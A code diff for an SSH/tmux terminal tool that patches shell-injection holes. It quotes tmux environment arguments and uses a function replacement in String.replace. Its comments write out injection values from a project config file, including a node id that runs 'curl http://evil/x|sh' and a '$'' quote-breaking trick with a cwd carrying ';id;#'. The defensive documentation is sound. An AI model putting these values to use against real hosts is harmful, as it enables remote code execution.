@@ -477,14 +477,37 @@ export function remoteHookEnvArgs(
   return env
 }
 /** Contents of the remote endpoint env file the managed hook script sources (unix-socket transport). */
-export function remoteEndpointFileContents(sock: string, token: string, version: string): string {
-  return `NODETERM_HOOK_SOCK=${sock}\nNODETERM_HOOK_TOKEN=${token}\nNODETERM_HOOK_VERSION=${version}\n`
+export function remoteEndpointFileContents(
+  sock: string,
+  token: string,
+  version: string,
+  tokenDir: string
+): string {
+  return (
+    `NODETERM_HOOK_SOCK=${sock}\n` +
+    `NODETERM_HOOK_TOKEN=${token}\n` +
+    `NODETERM_HOOK_VERSION=${version}\n` +
+    // The REMOTE token dir ($HOME/.nodeterm/node-tokens on the host), not ours. The host stores
+    // per-node tokens only; it never holds a secret and can never mint.
+    `NODETERM_NODE_TOKEN_DIR=${tokenDir}\n`
+  )
 }
 
 /**
  * The remote PTY program is `ssh <childArgs> host -t '<remoteTmuxCommand>'`. `extraEnv` is an
  * already-built list of tmux `-e KEY=VALUE` pairs (e.g. from `remoteHookEnvArgs`) spliced into
  * the `new-session` command right after `-A`, mirroring the local tmux `-e` placement.
+ *
+ * SECURITY — every token is `posixQuote`d, including the `-e` flags themselves (quoting a flag is
+ * a no-op to the shell, and hard-coding "even indices are flags" would be an assumption about a
+ * caller's array shape rather than a property of this function). This is NOT decoration: the
+ * result is ONE SHELL LINE handed to the remote user's login shell, and the values here carry the
+ * RAW node id (`NODETERM_NODE_ID`) and the managed-account config dir — both of which come out of
+ * `.nodeterm/project.json`, a file that travels in a cloned or shared repo and is written on
+ * remote hosts. Spliced unquoted (as this did until 2026-08), a node id of
+ * `n1;curl http://evil/x|sh;#` ended the tmux command and ran the rest as the SSH user the moment
+ * the victim opened that node. Everything else in `remoteTmuxCommand` was already quoted; this was
+ * the one gap. See control-master.injection.test.ts.
  */
 export function remoteTmuxPtyArgs(
   conn: SshConnection,
@@ -497,6 +520,15 @@ export function remoteTmuxPtyArgs(
   confPath?: string
 ): string[] {
   let cmd = remoteTmuxCommand({ sessionId, remoteCwd, program, programArgs, socket: RMT_TMUX_SOCKET, confPath })
-  if (extraEnv.length) cmd = cmd.replace('new-session -A ', `new-session -A ${extraEnv.join(' ')} `)
+  if (extraEnv.length)
+    // The replacement is a FUNCTION, not a string. This is load-bearing and not a style choice:
+    // in a STRING replacement `$'`, `` $` ``, `$&` and `$$` are expansion patterns, and `$'`
+    // splices the text FOLLOWING the match — `-s '<session>' -c '<cwd>' '<program>' '<args>'` —
+    // straight INSIDE the single-quoted token being built. That inverts the quote parity of that
+    // copy and un-quotes everything `remoteTmuxCommand` had carefully quoted, so an agent id of
+    // `claude$'` plus a project cwd of `/srv/app;id;#` (both from the same `.nodeterm/project.json`)
+    // was remote code execution EVEN WITH the posixQuote above. A function replacement is never
+    // pattern-expanded, so the quoted bytes land verbatim. See control-master.injection.test.ts.
+    cmd = cmd.replace('new-session -A ', () => `new-session -A ${extraEnv.map(posixQuote).join(' ')} `)
   return ['-t', ...childArgs(conn, controlPath, cmd)]
 }
